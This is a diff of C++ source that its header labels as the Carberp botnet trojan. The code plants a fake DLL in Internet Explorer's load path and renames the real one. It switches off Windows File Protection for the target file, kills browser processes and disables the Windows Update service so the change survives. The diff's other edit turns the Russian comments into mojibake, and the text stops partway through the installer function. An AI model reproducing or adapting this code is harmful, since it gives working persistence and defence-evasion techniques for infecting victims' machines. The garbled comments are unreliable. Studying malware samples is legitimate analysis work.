@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #include <windows.h>
 #include <shlobj.h>
@@ -30,9 +41,9 @@ namespace LDRDEBGTEMPLATES
 
 extern unsigned char fakeDllData[]; //fake.dll
 
-// Ф-ция поиска заданного якоря для буффере
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 // 
-// Возвращает указатель на найденный буффер или NULL, если найти не удалось
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ NULL, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 LPBYTE LookupAnchor(const LPVOID Buffer, DWORD BufferSize, const LPBYTE Anchor, DWORD AnchorSize)
 {
 	BYTE* Current = (BYTE*)Buffer;
@@ -49,9 +60,9 @@ LPBYTE LookupAnchor(const LPVOID Buffer, DWORD BufferSize, const LPBYTE Anchor, 
 	return NULL;
 }
 
-// Ф-ция встраивает настройки в тело FakeDll.
-// Возвращает ненулевое значение, если всё встроилось нормально и 
-// NULL - если произошли ошибки
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ FakeDll.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 
+// NULL - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 LPBYTE CreateFakeDllWithBuiltingSettings(
 	const char* CryptKey,
 	const char* DllName,
@@ -99,32 +110,32 @@ LPBYTE CreateFakeDllWithBuiltingSettings(
 	{
 		AnchorDesc& ad = ReplaceByAnchorList[i];
 		
-		// Если данных больше, чем буффер, берем следующую настойку
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		int size = m_lstrlen(ad.Value) + 1;
 		if( size > ad.AnchorBufferSize ) continue;
 
-		// Ищем якорь
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		int sizeAnchor = m_lstrlen(ad.Anchor);
 		LPBYTE AnchorBuffer = LookupAnchor( NewDllBody, DllSize, (BYTE*)ad.Anchor, sizeAnchor );
 
-		// Если якорь не найден - берем следующую настойку
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( AnchorBuffer == NULL ) continue;
 
 
-		// Обнуляем найденный буфер
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		m_memset( AnchorBuffer, 0, ad.AnchorBufferSize );
 
-		// Копируем данные в буффер
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		m_memcpy( AnchorBuffer, ad.Value, size );
 
-		// Если стоит признак шифровать - шифруем весь буффер
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if( ad.EncryptValue ) 
 			XORCrypt::Crypt( (char*)CryptKey, (BYTE*)AnchorBuffer, ad.AnchorBufferSize );
 
 		ReplacedCount++;
 	}
 
-	// Если что-то не влезает или не находится - возвращаем ошибку.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	if (ReplacedCount != ARRAYSIZE(ReplaceByAnchorList))
 	{
 		MemFree(NewDllBody);
@@ -134,9 +145,9 @@ LPBYTE CreateFakeDllWithBuiltingSettings(
 	return (LPBYTE)NewDllBody;
 }
 
-// Возвращает версию установленного IE
-// Информация берется из реестра (HKLM\Software\Microsoft\Internet Explorer:Version)
-// Если в результате возвращается 0 - невозможно определить
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IE
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (HKLM\Software\Microsoft\Internet Explorer:Version)
+// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD GetIeVersion()
 {
 	HKEY  Key = NULL;
@@ -170,8 +181,8 @@ DWORD GetIeVersion()
 }
 
 
-// Незначительно меняет имя исходной длл путем добавления 
-// в начало имени случайного символа
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 char* CreateRealDllName(const char* DllName, char* newDllName )
 {
 	newDllName[0] = 'a' + ((DWORD)pGetTickCount() % ('z' - 'a' + 1));
@@ -179,21 +190,21 @@ char* CreateRealDllName(const char* DllName, char* newDllName )
 	return newDllName;
 }
 
-// Ф-ция отключает слежение SFC за файлом на одну минуту.(http://bitsum.com/aboutwfp.asp/)
-// За это время надо заменить файл.
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SFC пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.(http://bitsum.com/aboutwfp.asp/)
+// пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 bool SetSfcExceptionForOneMinute( const char* pathFile )
 {
 	FAKEDLLDBG("AddFilePathToSfcExceptionList", "Started with Path='%s'", pathFile);
 
-	// Проверяет на факт того, что файл защищается SFC
-	// Возвращает TRUE если защищается и FALSE если нет
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SFC
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TRUE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ FALSE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	typedef BOOL  (WINAPI * SfcIsFileProtectedFunction)(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName);
 
-	// Недокументированный вызов. 
-	// Отключает SFC для указанного файла на 1 минуту (http://bitsum.com/aboutwfp.asp/)
-	// Способ вызова: SfcFileSetException(NULL, L"c:\\windows\\notepad.exe", -1);
-	// Если всё хорошо - возвращает 0
-	// Если не хорошо - возвращает не 0
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ. 
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SFC пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 1 пїЅпїЅпїЅпїЅпїЅпїЅ (http://bitsum.com/aboutwfp.asp/)
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: SfcFileSetException(NULL, L"c:\\windows\\notepad.exe", -1);
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 0
 	typedef DWORD (WINAPI * SfcFileSetExceptionFunction)(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName,DWORD Mode);
 
 	HMODULE SfcDllHandle = (HMODULE)pLoadLibraryA("sfc_os.dll");
@@ -210,12 +221,12 @@ bool SetSfcExceptionForOneMinute( const char* pathFile )
 	FAKEDLLDBG("AddFilePathToSfcExceptionList", "SfcIsFileProtected=0x%X SfcFileSetException=0x%X", 
 		SfcIsFileProtected, SfcFileSetException);
 	
-	// Если не удалось подгрузить ф-ции - завершаем работы с ошибкой
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (SfcIsFileProtected == NULL) return false;
 	if (SfcFileSetException == NULL) return false;
 
 	wchar_t* Path = AnsiToUnicode( (char*)pathFile, 0 );
-	// Если файл не защищается - просто завершаемся с положительным результатом
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	BOOL FileProtectedBySfc = SfcIsFileProtected(NULL, Path);
 	FAKEDLLDBG("AddFilePathToSfcExceptionList", "FileProtectedBySfc=%d", FileProtectedBySfc);
 
@@ -230,10 +241,10 @@ bool SetSfcExceptionForOneMinute( const char* pathFile )
 	return ret;
 }
 
-// В зависимости от версии IE :
-// 1) выбирает путь ДЛЛ, в которую будет сохранятся FakeDll
-// 2) выбирает путь ДЛЛ, куда будет перемещена оригинальная ДЛЛ
-// 3) флаг необходимости перемещения FakeDllPath в RealDllPath
+// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ IE :
+// 1) пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FakeDll
+// 2) пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+// 3) пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FakeDllPath пїЅ RealDllPath
 bool SelectTargetIeDll(
 	char* FakeDllPath,
 	char* RealDllPath,
@@ -263,17 +274,17 @@ bool SelectTargetIeDll(
 	BOOL  DirectoryObtained = FALSE;
 	DWORD IeVersion = GetIeVersion();
 
-	// Если невозможно определить версию IE - вернуть ошибку
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ IE - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (IeVersion == 0) return false;
 	
-	// Пока реализовано только для версий 6, 7 и 8
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 6, 7 пїЅ 8
 	if (IeVersion < 6) return false;
 	if (IeVersion > 8) return false;
 
-	// Получаем путь к Program Files
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ Program Files
 	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathA(NULL, ProgramFilesPath, CSIDL_PROGRAM_FILES, false);
 	if (DirectoryObtained == FALSE) return false;
-	// Получаем путь к System32
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ System32
 	DirectoryObtained = (BOOL)pSHGetSpecialFolderPathW(NULL, System32Path, CSIDL_SYSTEM, false);
 	if (DirectoryObtained == FALSE) return false;
 
@@ -282,9 +293,9 @@ bool SelectTargetIeDll(
 
 	if (IeVersion == 6) 
 	{
-		// Для IE 6 будем делать подмену системной DLLки путем создания с таким же именем 
-		// в папке IE. Поскольку порядок загрузки начинается с папки с программой,
-		// загрузка не по абсолютному пути начнется с нашей DLLки.
+		// пїЅпїЅпїЅ IE 6 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLLпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
+		// пїЅ пїЅпїЅпїЅпїЅпїЅ IE. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ DLLпїЅпїЅ.
 		MoveFakeToRealBeforeFakeSave = false;
 		DllName = Ie6Files[RandNumber % ARRAYSIZE(Ie6Files)];;
 
@@ -297,8 +308,8 @@ bool SelectTargetIeDll(
 		return true;
 	}
 	
-	// Для IE7 и IE8 механизм одинаков
-	// Подмена делается 
+	// пїЅпїЅпїЅ IE7 пїЅ IE8 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 
 	if (IeVersion == 7) 
 		DllName = Ie7Files[RandNumber % ARRAYSIZE(Ie7Files)];
@@ -321,8 +332,8 @@ bool SelectTargetIeDll(
 	return true;
 }
 
-// Возвращает тело FakeDll
-// Если не получается получить - возвращает NULL
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ FakeDll
+// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NULL
 LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 {
 	LPVOID buf;
@@ -333,21 +344,21 @@ LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 		return 0;
 }
 
-// Убивает все процессы IE (а с ним и все остальные браузеры)
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IE (пїЅ пїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 void KillAllIeProcesses()
 {
 	FAKEDLLDBG("KillAllIeProcesses", "runned");
 	KillAllBrowsers();
 }
 
-// При подмене ДЛЛки для IE сервис обновления обнаруживает изменения
-// и устанавливает обновление, которое заменяет нашу длл на оригинальную.
-// Чтобы избежать этого, при установке надо отключить сервис обновлений Windows.
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ IE пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Windows.
 void TryDisableAutoUpdateService()
 {
 	FAKEDLLDBG("DisableAutoUpdateService", "started");
 
-	// Сначала по тихому пробуем установить значение в реестре в
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
 	// Disabled
 	HKEY  Key = NULL;
 	DWORD status = 0;
@@ -362,8 +373,8 @@ void TryDisableAutoUpdateService()
 	pRegCloseKey(Key);
 	if (status != ERROR_SUCCESS) return;
 
-	// После успешной модификации реестра пробуем остановить сервис.
-	// Настройки из реестра применится только после перезагрузки
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	SC_HANDLE ScmHandle = NULL;
 	SC_HANDLE SvcHandle = NULL;
 
@@ -380,7 +391,7 @@ void TryDisableAutoUpdateService()
 		BOOL InitStopResult = ControlService(SvcHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
 		if (InitStopResult != TRUE) break;
 
-		// 2 минуты ждемс
+		// 2 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		DWORD Timeout   = 2 * 60 * 1000;
 		DWORD StartTime = (DWORD)pGetTickCount();
 		
@@ -405,7 +416,7 @@ void TryDisableAutoUpdateService()
 	if (ScmHandle != NULL) CloseServiceHandle(ScmHandle);
 }
 
-// Ф-ция установки 
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 BOOL InstallForIe()
 {
 	LPBYTE FakeDllWithSettings = NULL;
@@ -419,10 +430,10 @@ BOOL InstallForIe()
 		FAKEDLLDBG("InstallForIe", 
 			"GetBuiltinFakeBody() dll=0x%X size=%u", FakeDllBody, FakeDllSize);
 
-		// Проверка на встроенность тела FakeDll
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ FakeDll
 		if (FakeDllBody == NULL) break;
 
-		// Выбираем дллку для замещения.
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		char FakeDllPath[MAX_PATH];
 		char RealDllPath[MAX_PATH];
 		bool MoveFakeToRealBeforeFakeSave = false;
@@ -436,7 +447,7 @@ BOOL InstallForIe()
 
 		// Generate crypt key
 		char* CryptKey = MakeMachineID();
-		// Встраиваем в фейковую длл все параметры, необходимые для работы 
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
 		// (crypt key, new target dll path, path to crypted botplug) 
 		FakeDllWithSettings = CreateFakeDllWithBuiltingSettings( CryptKey, 
 			RealDllPath, GetBotPlugFileName().t_str(), FakeDllBody, FakeDllSize );
@@ -448,9 +459,9 @@ BOOL InstallForIe()
 
 		if (MoveFakeToRealBeforeFakeSave)
 		{
-			// Пробуем переменовать целевую DLLку
-			// Если не получается - пробуем прибить все процессы IE и пробуем 
-			// переименовывать опять.
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLLпїЅпїЅ
+			// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IE пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
 			DWORD MaxAttemptsCount = 5;
 			DWORD AttemptsCount = 0;
@@ -463,9 +474,9 @@ BOOL InstallForIe()
 				
 				if (MoveResult == TRUE) break;
 
-				// Если Move не получается - предполагаем что файл занят.
-				// Убиваем все процессы IE, спим немного для ожидания завершения процессов 
-				// и пробуем еще.
+				// пїЅпїЅпїЅпїЅ Move пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IE, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+				// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
 				KillAllIeProcesses();
 				pSleep(1 * 1000);
 				AttemptsCount++;
@@ -477,7 +488,7 @@ BOOL InstallForIe()
 			if (AttemptsCount == MaxAttemptsCount) break;
 		}
 		
-		// Если переименованиме прошло успешно - сохраняем дллку
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		DWORD Written = File::WriteBufferA( FakeDllPath, FakeDllWithSettings, FakeDllSize );
 
 		FAKEDLLDBG("InstallForIe", "WriteBuffer for target dll.(Written=%u FakeDllSize=%u)",
@@ -485,7 +496,7 @@ BOOL InstallForIe()
 
 		if( Written != FakeDllSize ) break;
 
-		// Если всё прошло успешно - отключаем сервис обновления Windows
